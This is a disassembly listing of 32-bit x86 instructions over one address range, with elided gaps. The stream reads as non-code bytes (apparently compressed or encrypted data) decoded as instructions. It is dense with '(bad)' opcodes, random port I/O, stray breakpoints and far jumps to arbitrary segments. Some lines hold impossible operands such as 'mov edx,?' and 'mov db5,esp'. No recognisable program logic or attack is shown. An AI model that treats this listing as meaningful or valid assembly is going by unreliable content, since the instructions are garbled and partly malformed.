  42dc36:	or     eax,0xf6069c5d
  42dc3b:	and    al,0xca
  42dc3d:	mov    al,0x5c
  42dc3f:	bound  eax,QWORD PTR [esi+0x1fe321d6]
  42dc45:	scas   al,BYTE PTR es:[edi]
  42dc46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc47:	or     DWORD PTR [ecx],esp
  42dc49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc4a:	int3   
  42dc4b:	dec    ebp
  42dc4c:	sub    DWORD PTR [esi+edx*1+0x2cf529f0],ebx
  42dc53:	add    BYTE PTR [ecx+esi*1-0x6f341685],bh
  42dc5a:	sbb    BYTE PTR [ecx+edx*2+0x74],cl
  42dc5e:	cld    
  42dc5f:	ss repz dec esp
  42dc62:	and    al,0x8
  42dc64:	xchg   esp,eax
  42dc65:	cmp    eax,0x163bcaee
  42dc6a:	jnp    0x42dc1e
  42dc6c:	mov    dh,ah
  42dc6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc6f:	mov    ebp,0xc6af42
  42dc74:	or     eax,DWORD PTR [ecx]
  42dc76:	cdq    
  42dc77:	xchg   WORD PTR ds:[edx],ax
  42dc7b:	push   esp
  42dc7c:	out    0x9f,eax
  42dc7e:	cdq    
  42dc7f:	mov    al,0x5b
  42dc81:	or     edx,0xffffffad
  42dc84:	test   eax,0xdfb7868b
  42dc89:	jno    0x42dc96
  42dc8b:	fild   QWORD PTR [eax+0x5]
  42dc8e:	lea    edi,[eax+0x0]
	...
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	cli    
  42dd01:	jo     0x42dce7
  42dd03:	int3   
  42dd04:	sub    al,0xea
  42dd06:	add    DWORD PTR [eax],eax
  42dd08:	add    al,0x1
  42dd0a:	add    BYTE PTR [eax],al
  42dd0c:	inc    ecx
  42dd0d:	pop    ss
  42dd0e:	add    al,0xe0
  42dd10:	dec    ebx
  42dd11:	dec    esi
  42dd12:	les    edi,FWORD PTR [edx+0x6a]
  42dd15:	les    ebx,FWORD PTR [edx+0x6d]
  42dd18:	or     al,BYTE PTR es:[edi+0x9]
  42dd1c:	adc    esp,edi
  42dd1e:	(bad)  
  42dd1f:	int3   
  42dd20:	mov    eax,0xe9fc65b
  42dd25:	xchg   esp,eax
  42dd26:	gs imul ebp,ebx,0x39
  42dd2a:	jge    0x42dd67
  42dd2c:	outs   dx,DWORD PTR ds:[esi]
  42dd2d:	jns    0x42dd51
  42dd2f:	jno    0x42dd71
  42dd31:	inc    esi
  42dd32:	daa    
  42dd33:	adc    eax,0xff433489
  42dd38:	out    dx,eax
  42dd39:	das    
  42dd3a:	mov    bl,BYTE PTR [edi-0x32b1fcf7]
  42dd40:	mov    edx,0xc71abb7a
  42dd45:	out    0xf9,al
  42dd47:	retf   
  42dd48:	inc    edx
  42dd49:	jge    0x42dd14
  42dd4b:	sub    bh,BYTE PTR ds:0x6fb899a8
  42dd51:	out    dx,al
  42dd52:	in     eax,0x59
  42dd54:	mov    ebp,DWORD PTR [ebp-0x21227cd3]
  42dd5a:	repnz pop ecx
  42dd5c:	adc    eax,0xe05431bd
  42dd61:	pop    ebx
  42dd62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd63:	loop   0x42ddc7
  42dd65:	ss pop edi
  42dd67:	xor    DWORD PTR [eax-0x13],ebp
  42dd6a:	jmp    0x42ddb1
  42dd6c:	in     al,0xae
  42dd6e:	(bad)  
  42dd6f:	in     al,0xcc
  42dd71:	fwait
  42dd72:	arpl   WORD PTR [edx-0x5a],di
  42dd75:	inc    ebp
  42dd76:	and    esi,DWORD PTR [eax+0xe28cc33]
  42dd7c:	mov    eax,0x25d695d9
  42dd81:	into   
  42dd82:	dec    ecx
  42dd83:	int3   
  42dd84:	sbb    eax,DWORD PTR [esi]
  42dd86:	fld    QWORD PTR [edi]
  42dd88:	jmp    0xd920:0xd5805d32
  42dd8f:	jmp    0x2a4c:0xa419b278
  42dd96:	loopne 0x42dd3f
  42dd98:	sbb    eax,0x40ee433a
  42dd9d:	pop    ebp
  42dd9e:	bound  esi,QWORD PTR [eax+0x2c146669]
  42dda4:	cmp    eax,0x9ba56416
  42dda9:	jns    0x42dd4f
  42ddab:	sub    al,0x49
  42ddad:	sub    DWORD PTR [ebx-0x36],0xdba55063
  42ddb4:	aaa    
  42ddb5:	xor    DWORD PTR [ebp+edi*8-0x8a3eaae],0x5a
  42ddbd:	les    edx,FWORD PTR [edi-0x40]
  42ddc0:	dec    esi
  42ddc2:	aaa    
  42ddc3:	les    ebx,FWORD PTR [esi]
  42ddc5:	jnp    0x42dd87
  42ddc7:	dec    ecx
  42ddc8:	loope  0x42de39
  42ddca:	cs pop esi
  42ddcc:	xchg   BYTE PTR [ebx],bh
  42ddce:	inc    eax
  42ddcf:	out    dx,eax
  42ddd0:	sub    edi,edx
  42ddd2:	and    esp,DWORD PTR [edx+0x14]
  42ddd5:	js     0x42de4a
  42ddd7:	push   ss
  42ddd8:	(bad)  
  42ddd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ddda:	or     BYTE PTR [ebx-0x7b],ch
  42dddd:	pop    esi
  42ddde:	(bad)  
  42dde0:	sbb    ebx,DWORD PTR [edx]
  42dde2:	hlt    
  42dde3:	into   
  42dde4:	popa   
  42dde5:	lock push cs
  42dde7:	pop    ds
  42dde8:	call   0x4db52e0a
  42dded:	sub    DWORD PTR [ecx],esi
  42ddef:	daa    
  42ddf0:	jnp    0x42de29
  42ddf2:	add    al,0xf8
  42ddf4:	scas   eax,DWORD PTR es:[edi]
  42ddf5:	sbb    DWORD PTR [edi+ebx*2],esi
  42ddf8:	jmp    0xb3ed:0xd73e852a
  42ddff:	inc    eax
  42de00:	mov    bh,0x37
  42de02:	dec    edx
  42de03:	loop   0x42dde8
  42de05:	fcomi  st,st(0)
  42de07:	shl    DWORD PTR [edx],0x93
  42de0a:	xchg   ecx,eax
  42de0b:	sbb    al,0x2
  42de0d:	pushf  
  42de0e:	jle    0x42dda1
	...
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	inc    ebp
  42de81:	lods   al,BYTE PTR ds:[esi]
  42de82:	popf   
  42de83:	mov    ch,0x30
  42de85:	jmp    0x42de88
  42de87:	add    BYTE PTR [ecx+eax*1],al
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	jnp    0x42de7c
  42de8e:	aas    
  42de8f:	(bad)  
  42de90:	arpl   WORD PTR [edi],sp
  42de92:	mov    esi,0x7b33e8c
  42de97:	(bad)  
  42de98:	cli    
  42de99:	mov    cl,0x3b
  42de9b:	mov    BYTE PTR [esi-0x2eedd95d],dl
  42dea1:	push   ebx
  42dea2:	popf   
  42dea3:	out    dx,al
  42dea4:	inc    ebp
  42dea5:	cmp    dl,ch
  42dea7:	xor    al,0xe7
  42dea9:	into   
  42deaa:	js     0x42df1d
  42deac:	mov    edi,0x77b383b1
  42deb1:	sub    eax,0x76d1ba25
  42deb6:	loop   0x42df36
  42deb8:	sbb    ecx,DWORD PTR [eax-0x5f]
  42debb:	dec    ebp
  42debc:	sbb    BYTE PTR [edi],cl
  42debe:	ret    0x93b1
  42dec1:	int3   
  42dec2:	jnp    0x42def9
  42dec4:	mov    ecx,0x62c9f6c2
  42dec9:	jmp    0x23ef8571
  42dece:	jg     0x42de75
  42ded0:	loope  0x42df2f
  42ded2:	adc    ch,al
  42ded4:	lea    esp,[eax-0x25]
  42ded7:	push   esi
  42ded8:	sbb    al,0x4a
  42deda:	lods   al,BYTE PTR ds:[esi]
  42dedb:	lock (bad) 
  42dedd:	icebp  
  42dede:	(bad)  [ecx+0x5d]
  42dee1:	sub    DWORD PTR ds:0xbc0f2fa5,edx
  42dee7:	mov    dl,0x57
  42dee9:	pop    ds
  42deea:	sbb    al,0xd6
  42deec:	and    eax,0xdd694e02
  42def1:	dec    esi
  42def2:	and    DWORD PTR [edi+0x33],0xb2b5c9ae
  42def9:	jno    0x42df77
  42defb:	lea    esi,[edi]
  42defd:	jnp    0x42deb7
  42deff:	cs sahf 
  42df01:	bound  edx,QWORD PTR [eax]
  42df03:	cld    
  42df04:	rcr    DWORD PTR [eax-0x2cfe8deb],1
  42df0a:	fstp   TBYTE PTR [edi+0x13091e32]
  42df10:	inc    edi
  42df11:	push   esp
  42df12:	pop    ecx
  42df13:	mov    ebx,0xcd8c73f0
  42df18:	ja     0x42df00
  42df1a:	int    0x34
  42df1c:	push   eax
  42df1d:	pop    edx
  42df1e:	mov    eax,0x1028adcc
  42df23:	mov    edx,?
  42df25:	add    esp,DWORD PTR [ebx+0x113ec9db]
  42df2b:	stos   DWORD PTR es:[edi],eax
  42df2c:	push   eax
  42df2d:	jae    0x42df01
  42df2f:	and    edi,eax
  42df31:	dec    edx
  42df32:	or     DWORD PTR [ebx],edi
  42df34:	sub    al,BYTE PTR [ebp-0x2b]
  42df37:	aam    0x74
  42df39:	pop    ebp
  42df3a:	gs pop eax
  42df3c:	std    
  42df3d:	rcr    BYTE PTR [edx+0x26],0x48
  42df41:	rcr    DWORD PTR [ebp-0x79],1
  42df44:	cmp    eax,0xad91afb2
  42df49:	mov    dh,dl
  42df4b:	sbb    cl,BYTE PTR [edx]
  42df4d:	push   ds
  42df4e:	and    esi,ebp
  42df50:	fisub  WORD PTR [eax]
  42df52:	fdivr  DWORD PTR [ecx+0x6c]
  42df55:	sbb    ebx,ecx
  42df57:	retf   
  42df58:	xchg   ecx,eax
  42df59:	xor    DWORD PTR [ebp+0x22],eax
  42df5c:	pusha  
  42df5d:	and    DWORD PTR [ebx+0x52b606c4],edi
  42df63:	cs or  esp,esi
  42df66:	pop    edx
  42df67:	aaa    
  42df68:	das    
  42df69:	xchg   ebp,eax
  42df6a:	icebp  
  42df6b:	sub    BYTE PTR [edi-0x12],dh
  42df6e:	add    eax,0x99c657c0
  42df73:	mov    BYTE PTR [ebp+0x2ff4617b],dl
  42df79:	sbb    BYTE PTR ds:[ecx],al
  42df7c:	inc    edx
  42df7d:	retf   0xc97f
  42df80:	pop    ebp
  42df81:	sahf   
  42df82:	mov    edx,0xabaf89af
  42df87:	sub    al,0x21
  42df89:	jp     0x42df59
  42df8b:	mov    cl,0x39
  42df8d:	sbb    al,0x58
  42df8f:	call   0x42df94
	...
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x4d]
  42e001:	mov    eax,ds:0xec34c25f
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    al,0x1
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	dec    ecx
  42e00d:	jno    0x42df91
  42e00f:	test   eax,0xdb6518ab
  42e014:	pop    edi
  42e015:	add    DWORD PTR [edx],esp
  42e017:	sub    DWORD PTR [edx],eax
  42e019:	ret    0xdec
  42e01c:	in     eax,dx
  42e01d:	inc    edx
  42e01e:	inc    bx
  42e020:	xor    al,0xbd
  42e022:	xlat   BYTE PTR ds:[ebx]
  42e023:	add    BYTE PTR [edx+0x40682702],0x57
  42e02a:	mov    bh,BYTE PTR [ecx-0x28]
  42e02d:	sahf   
  42e02e:	mov    al,0x65
  42e030:	mov    eax,ds:0xcc5cdec4
  42e035:	pop    esp
  42e036:	cmp    ebx,ecx
  42e038:	icebp  
  42e039:	add    al,0x68
  42e03b:	pop    esi
  42e03c:	add    DWORD PTR [ecx+0xb],ecx
  42e03f:	mov    dh,0xdf
  42e041:	jg     0x42dfcf
  42e043:	les    ecx,FWORD PTR [ebx-0x44]
  42e046:	cld    
  42e047:	sbb    ebp,DWORD PTR [esi-0x4ae25223]
  42e04d:	clc    
  42e04e:	mov    eax,0x5f4fd135
  42e053:	fadd   st(4),st
  42e055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e056:	(bad)  
  42e057:	cdq    
  42e058:	adc    al,0xdd
  42e05a:	sbb    esp,DWORD PTR [esi-0x38]
  42e05d:	repz ret 
  42e05f:	cmp    bh,BYTE PTR [eax+ebx*1-0x46]
  42e063:	mov    WORD PTR [esi-0x5e],gs
  42e066:	push   0x73
  42e068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e069:	sbb    BYTE PTR [edi-0x6a],cl
  42e06c:	dec    ebx
  42e06d:	add    dh,BYTE PTR [edi-0x72]
  42e070:	imul   edi,DWORD PTR [edx+0x41],0xffffffd0
  42e074:	jae    0x42e04e
  42e076:	mov    edi,0x418bab51
  42e07b:	push   edi
  42e07c:	(bad)  
  42e07d:	mov    edx,0xcb38daf2
  42e082:	pop    ss
  42e083:	sti    
  42e084:	and    DWORD PTR [ecx-0x421063bb],ecx
  42e08a:	(bad)  
  42e08b:	adc    BYTE PTR [eax-0x25ba2f50],ah
  42e091:	pop    edi
  42e092:	in     eax,0x11
  42e094:	and    eax,0x83892c40
  42e099:	inc    eax
  42e09a:	dec    edx
  42e09b:	psubq  mm6,QWORD PTR [ebx]
  42e09e:	push   es
  42e09f:	and    BYTE PTR [ebx-0xf],0x99
  42e0a3:	test   ecx,0xc36b6b74
  42e0a9:	xor    al,0x82
  42e0ab:	call   DWORD PTR [ebp-0x30]
  42e0ae:	leave  
  42e0af:	xchg   DWORD PTR [edi+0x52],ecx
  42e0b2:	sti    
  42e0b3:	(bad)  
  42e0b5:	mov    eax,0x3bdd70ef
  42e0ba:	stos   BYTE PTR es:[edi],al
  42e0bb:	jns    0x42e123
  42e0bd:	shl    ebx,1
  42e0bf:	repnz xchg ecx,eax
  42e0c1:	push   edi
  42e0c2:	mov    ss,WORD PTR [ebp-0x4]
  42e0c5:	jmp    0x42e056
  42e0c7:	adc    ch,BYTE PTR [edx+esi*1+0x5c447d5c]
  42e0ce:	cmp    al,0x52
  42e0d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e0d1:	(bad)  
  42e0d2:	lea    eax,[ebp+0x7cc08f7d]
  42e0d8:	dec    edi
  42e0d9:	div    dh
  42e0db:	int3   
  42e0dc:	and    DWORD PTR [edi],esi
  42e0de:	shr    BYTE PTR [ebp-0x2ffc15f7],0xf
  42e0e5:	enter  0x59ac,0x10
  42e0e9:	iret   
  42e0ea:	ds mov esi,0x125834f0
  42e0f0:	retf   0x2907
  42e0f3:	sti    
  42e0f4:	or     al,0x1e
  42e0f6:	fwait
  42e0f7:	mov    eax,0x781643e1
  42e0fc:	(bad)
  42e0ff:	xlat   BYTE PTR ds:[ebx]
  42e100:	(bad)  
  42e101:	fisttp DWORD PTR [edi-0x33bce58e]
  42e107:	shr    BYTE PTR [ecx-0x4150595b],0x6b
  42e10e:	adc    al,0x89
	...
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	loop   0x42e134
  42e182:	dec    esi
  42e183:	icebp  
  42e184:	cmp    ch,ch
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    al,0x1
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	dec    edx
  42e18d:	shl    DWORD PTR [ebp-0x3],0x11
  42e191:	ja     0x42e15d
  42e193:	fbstp  TBYTE PTR [ebp+0x54]
  42e196:	clc    
  42e197:	mov    ds:0x639ad14a,eax
  42e19c:	call   0xc8b3:0x73d0c303
  42e1a3:	dec    eax
  42e1a4:	fdivr  QWORD PTR [esi]
  42e1a6:	mov    WORD PTR [edx-0x5a],?
  42e1a9:	dec    edx
  42e1aa:	add    al,0x52
  42e1ac:	xchg   ecx,eax
  42e1ad:	mov    cs,WORD PTR [ebp+0x5b]
  42e1b0:	stc    
  42e1b1:	xchg   DWORD PTR [esi+0x27],esi
  42e1b4:	retf   
  42e1b5:	and    eax,0x81aef5c2
  42e1ba:	xchg   esp,eax
  42e1bb:	sbb    eax,0xfd2ace22
  42e1c0:	mov    eax,0x14ad249e
  42e1c5:	push   0x50d58bdf
  42e1ca:	cmp    al,0xdc
  42e1cc:	lods   al,BYTE PTR ds:[esi]
  42e1cd:	sbb    al,0x5
  42e1cf:	sbb    DWORD PTR [edi+0x9],ebx
  42e1d2:	xchg   edi,eax
  42e1d3:	fldcw  WORD PTR [edi]
  42e1d5:	sbb    eax,0xe81ee287
  42e1da:	or     bh,BYTE PTR [esi-0x1423fe62]
  42e1e0:	fistp  WORD PTR [edi]
  42e1e2:	out    0xd5,al
  42e1e4:	sub    edx,edx
  42e1e6:	push   edx
  42e1e7:	mov    ch,0xec
  42e1e9:	inc    esp
  42e1ea:	ror    BYTE PTR [edx-0x64],0xbf
  42e1ee:	or     DWORD PTR [eax+0x3a62150d],esp
  42e1f4:	ret    
  42e1f5:	dec    edx
  42e1f6:	retf   0x2cd2
  42e1f9:	jb     0x42e260
  42e1fb:	jmp    0x3ffd:0x48222a0a
  42e202:	and    DWORD PTR [ecx+0x7c],0x7c
  42e206:	ficomp DWORD PTR [ebp-0x1f015515]
  42e20c:	xchg   ecx,eax
  42e20d:	dec    esp
  42e20e:	sbb    DWORD PTR [edx+ebx*4-0x46a52553],edi
  42e215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e216:	pop    ebp
  42e217:	ror    BYTE PTR [edi+0x1db2bc1e],0xf4
  42e21e:	inc    edx
  42e21f:	pop    ebx
  42e220:	push   edx
  42e221:	inc    ecx
  42e222:	inc    edx
  42e223:	push   ecx
  42e224:	daa    
  42e225:	adc    bl,dh
  42e227:	pop    edx
  42e228:	fwait
  42e229:	(bad)  
  42e22a:	outs   dx,BYTE PTR gs:[esi]
  42e22c:	lds    ebx,FWORD PTR [eax]
  42e22e:	mov    db5,esp
  42e231:	nop
  42e232:	mov    ebx,0x99112a86
  42e237:	cli    
  42e238:	inc    edx
  42e239:	rol    BYTE PTR [edi+ebp*4+0x61],cl
  42e23d:	cmp    edx,eax
  42e23f:	hlt    
  42e240:	or     esp,DWORD PTR [ebx+0xc]
  42e243:	sbb    edi,DWORD PTR [ecx+0x3345d84e]
  42e249:	sub    BYTE PTR ds:0x3f1d4bcd,ch
  42e24f:	inc    eax
  42e250:	pop    esp
  42e251:	push   ebx
  42e252:	pop    eax
  42e253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e254:	pop    ss
  42e255:	pop    eax
  42e256:	mov    dh,0x91
  42e258:	mov    ah,0x24
  42e25a:	rcl    ecx,0x53
  42e25d:	cmp    eax,0xed847e35
  42e262:	xchg   esi,eax
  42e263:	sbb    DWORD PTR [edi-0x2e535a34],esp
  42e269:	and    edx,DWORD PTR ds:[ecx+0xe]
  42e26d:	mov    edi,0x43656d2c
  42e272:	xchg   edx,eax
  42e273:	jle    0x42e206
  42e275:	pop    esp
  42e276:	mov    bh,0x99
  42e278:	mov    esp,0x2151386f
  42e27d:	or     esi,DWORD PTR ds:0x6ce823df
  42e283:	sub    eax,0x12114935
  42e288:	outs   dx,BYTE PTR ds:[esi]
  42e289:	jmp    0x42e233
  42e28b:	fiadd  WORD PTR [edx+0x7f]
  42e28e:	xchg   ecx,eax
  42e28f:	je     0x42e291
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x27199140
  42e301:	mov    DWORD PTR [eax],ecx
  42e303:	cmp    bh,BYTE PTR [esi+ebp*8]
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	test   DWORD PTR [ebx+0x38],0x36396fd8
  42e313:	inc    edi
  42e314:	add    al,0xdb
  42e316:	dec    ecx
  42e317:	xchg   esp,eax
  42e318:	data16 cld 
  42e31a:	jne    0x42e359
  42e31c:	pusha  
  42e31d:	pop    edx
  42e31e:	add    al,0x1c
  42e320:	cmp    al,BYTE PTR [ebx-0x44]
  42e323:	pop    es
  42e324:	push   esi
  42e325:	jmp    0x6b6d052d
  42e32a:	mov    fs,WORD PTR [edi+ebp*8]
  42e32d:	and    bl,BYTE PTR [ecx+0x26]
  42e330:	ins    BYTE PTR es:[edi],dx
  42e331:	call   0xf261f665
  42e336:	pop    eax
  42e337:	mov    al,ds:0x7efd14b3
  42e33c:	jecxz  0x42e36f
  42e33e:	pop    eax
  42e33f:	mov    ch,BYTE PTR [ecx-0x1e]
  42e342:	fmulp  st(3),st
  42e344:	sub    al,0x25
  42e346:	mov    DWORD PTR [eax+esi*4-0x4a],ebx
  42e34a:	jp     0x42e305
  42e34c:	fs enter 0x4b56,0x59
  42e351:	rcr    DWORD PTR [ebp+0x5f7913c],0x69
  42e358:	xchg   BYTE PTR [esi-0x66],bh
  42e35b:	mov    bl,0x0
  42e35d:	repz dec ebp
  42e35f:	add    edx,ebx
  42e361:	adc    eax,0x563a6d8d
  42e366:	iret   
  42e367:	pmulhw mm1,QWORD PTR [edx+edx*8-0x5f72e642]
  42e36f:	stos   BYTE PTR es:[edi],al
  42e370:	fisub  WORD PTR [esi-0x75f06a8e]
  42e376:	mov    ebx,0xbcf79cef
  42e37b:	cld    
  42e37c:	mov    ecx,0x2fc43e01
  42e381:	jae    0x42e338
  42e383:	sbb    bl,dl
  42e385:	int    0x69
  42e387:	xchg   ebp,eax
  42e388:	pop    ebx
  42e389:	mov    WORD PTR [esi+edx*2],gs
  42e38c:	in     al,0x63
  42e38e:	mov    bl,0x46
  42e390:	pop    edx
  42e391:	pop    eax
  42e392:	inc    esp
  42e393:	push   eax
  42e394:	add    al,0x83
  42e396:	test   eax,0xbe318c10
  42e39b:	loop   0x42e33b
  42e39d:	dec    ecx
  42e39e:	sbb    edi,edi
  42e3a0:	ja     0x42e32c
  42e3a2:	scas   eax,DWORD PTR es:[edi]
  42e3a3:	stos   DWORD PTR es:[edi],eax
  42e3a4:	xchg   edi,eax
  42e3a5:	push   cs
  42e3a6:	xor    ebp,0x232801c2
  42e3ac:	adc    cl,ch
  42e3ae:	popa   
  42e3af:	jl     0x42e357
  42e3b1:	jp     0x42e341
  42e3b3:	jb     0x42e363
  42e3b5:	mov    ds:0xe4da1cd5,al
  42e3ba:	retf   
  42e3bb:	popf   
  42e3bc:	icebp  
  42e3bd:	scas   eax,DWORD PTR es:[edi]
  42e3be:	mov    ebp,0xbdf37c3c
  42e3c3:	icebp  
  42e3c4:	mov    ch,0x92
  42e3c6:	fimul  DWORD PTR [ebp-0x5a]
  42e3c9:	cmp    eax,0x744e59a
  42e3ce:	aad    0x8f
  42e3d0:	mov    ch,0x8b
  42e3d2:	or     esi,ebp
  42e3d4:	jno    0x42e36b
  42e3d6:	mov    edi,0xb4273fde
  42e3db:	or     ebp,DWORD PTR ds:0x595b01ae
  42e3e1:	inc    edx
  42e3e2:	dec    ebp
  42e3e3:	xor    BYTE PTR [eax],cl
  42e3e5:	call   0xc13c:0x693dfbd6
  42e3ec:	inc    ecx
  42e3ed:	ja     0x42e3f2
  42e3ef:	lea    esp,[eax-0x71b4a928]
  42e3f5:	daa    
  42e3f6:	cmp    al,0x29
  42e3f8:	out    dx,al
  42e3f9:	mov    esp,0xf24bf3d7
  42e3fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e3ff:	call   0xff43:0xd431b755
  42e406:	sbb    BYTE PTR [esi-0x78],bh
  42e409:	jb     0x42e45a
  42e40b:	sub    DWORD PTR ds:0x3797d4,ecx
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	jl     0x42e43f
  42e482:	and    eax,0x1ef40c6
  42e487:	add    BYTE PTR [ecx+eax*1],al
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	mov    edi,0x447f3171
  42e491:	mov    esi,0x2812b1f3
  42e496:	pop    eax
  42e497:	cmp    al,0xc5
  42e499:	add    DWORD PTR [edx+esi*8-0x406b5136],0xffffffc5
  42e4a1:	arpl   WORD PTR [eax-0x18],si
  42e4a4:	push   cs
  42e4a5:	jmp    0x42e45a
  42e4a7:	add    BYTE PTR ss:[esi+0x46ba6051],ah
  42e4ae:	pop    ebp
  42e4b0:	test   al,0xef
  42e4b2:	mov    ch,0x4f
  42e4b4:	imul   edi,DWORD PTR [eax+0x3c9c40b8],0xcdfca918
  42e4be:	inc    edi
  42e4bf:	enter  0x37b1,0x66
  42e4c3:	out    0xbc,eax
  42e4c5:	repz pop esi
  42e4c7:	pop    ds
  42e4c8:	(bad)  
  42e4c9:	push   edi
  42e4ca:	gs dec edx
  42e4cc:	cld    
  42e4cd:	int3   
  42e4ce:	xchg   ecx,eax
  42e4cf:	jmp    0x8ab806e8
  42e4d4:	push   ecx
  42e4d5:	lds    esi,FWORD PTR [esi+0x30]
  42e4d8:	xchg   ecx,eax
  42e4d9:	(bad)  
  42e4da:	xlat   BYTE PTR ds:[ebx]
  42e4db:	icebp  
  42e4dc:	lods   eax,DWORD PTR ds:[esi]
  42e4dd:	mov    ds:0x3f3e28b3,al
  42e4e2:	xchg   ebx,eax
  42e4e3:	(bad)  
  42e4e4:	pop    edi
  42e4e5:	jmp    0x42e50d
  42e4e7:	out    0xb,eax
  42e4e9:	sbb    DWORD PTR [ebx],ebp
  42e4eb:	gs sbb bl,ah
  42e4ee:	bound  edi,QWORD PTR [eax+ebp*2+0x58]
  42e4f2:	cmp    eax,0x2a3eee89
  42e4f7:	sub    BYTE PTR [ecx],ch
  42e4f9:	pop    ds
  42e4fa:	dec    eax
  42e4fb:	jmp    0x42e57c
  42e4fd:	iret   
  42e4fe:	dec    edx
  42e4ff:	shr    DWORD PTR [eax-0x4dc5a3e],1
  42e505:	rcr    BYTE PTR [eax-0x12c90d7a],1
  42e50b:	jne    0x42e561
  42e50d:	mov    ah,0x8a
  42e50f:	and    esi,0x1e4517eb
  42e515:	into   
  42e516:	lahf   
  42e517:	retf   0x13ac
  42e51a:	cmp    al,0xe4
  42e51c:	rol    DWORD PTR [eax],0xa2
  42e51f:	mov    dh,0x51
  42e521:	mov    ss,WORD PTR [eax]
  42e523:	xchg   ebp,eax
  42e524:	pop    edi
  42e525:	or     al,0xce
  42e527:	not    BYTE PTR ds:[edx-0x54078b38]
  42e52e:	pop    ss
  42e52f:	ret    0xda12
  42e532:	or     ecx,DWORD PTR [ecx+eiz*1]
  42e535:	outs   dx,BYTE PTR ds:[esi]
  42e536:	imul   edx,esi,0x2dcbf17e
  42e53c:	mov    bh,0x52
  42e53e:	inc    esp
  42e53f:	lds    edi,FWORD PTR [edx+0x691cab41]
  42e545:	dec    ebp
  42e546:	fwait
  42e547:	(bad)  
  42e548:	pop    ebp
  42e549:	cli    
  42e54a:	push   bp
  42e54c:	(bad)  
  42e54d:	pop    esi
  42e54e:	or     eax,0x34d70b51
  42e553:	lds    esp,FWORD PTR [eax+0x2fc82b39]
  42e559:	mov    esi,0xfdd58c84
  42e55e:	sub    DWORD PTR [ebx-0x3a89ff06],0x60
  42e565:	pop    ebp
  42e566:	(bad)  
  42e567:	jg     0x42e5ad
  42e569:	test   al,0x2e
  42e56b:	push   ss
  42e56c:	add    ebx,DWORD PTR [ebp-0x33]
  42e56f:	mov    eax,0x4ca1878b
  42e574:	add    DWORD PTR ds:0xb601d38c,0xd702ce15
  42e57e:	adc    eax,0x132b4ea3
  42e583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e585:	mov    dh,0x5d
  42e587:	aas    
  42e588:	sbb    DWORD PTR [esi-0x3137c5cb],edi
  42e58e:	xor    ecx,DWORD PTR [esi+0x0]
	...
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e601:	adc    ebp,DWORD PTR [edi+ecx*4+0x1f044]
  42e608:	add    al,0x1
  42e60a:	add    BYTE PTR [eax],al
  42e60c:	inc    ecx
  42e60e:	fisub  DWORD PTR [edx]
  42e610:	inc    ebx
  42e611:	pushfw 
  42e613:	ss ret 
  42e615:	cli    
  42e616:	xor    BYTE PTR [esp+eax*1+0x17],0x89
  42e61b:	jbe    0x42e67c
  42e61d:	jns    0x42e686
  42e61f:	hlt    
  42e620:	dec    esi
  42e621:	es and al,0x4d
  42e624:	jl     0x42e67e
  42e626:	jmp    0xd60af717
  42e62b:	add    dl,BYTE PTR [edi]
  42e62d:	jo     0x42e619
  42e62f:	xchg   BYTE PTR [ecx-0x5056f263],dl
  42e635:	sbb    al,BYTE PTR [ecx+0x5cb64364]
  42e63b:	mov    bl,0x7
  42e63d:	pusha  
  42e63e:	add    al,BYTE PTR [ebx]
  42e640:	aaa    
  42e641:	jmp    0x42e635
  42e643:	dec    edi
  42e644:	mov    ds:0xf890bba1,al
  42e649:	frstor [esi-0x72d22053]
  42e64f:	push   cs
  42e650:	pop    ss
  42e651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e652:	adc    DWORD PTR [esi],0x8f9e6183
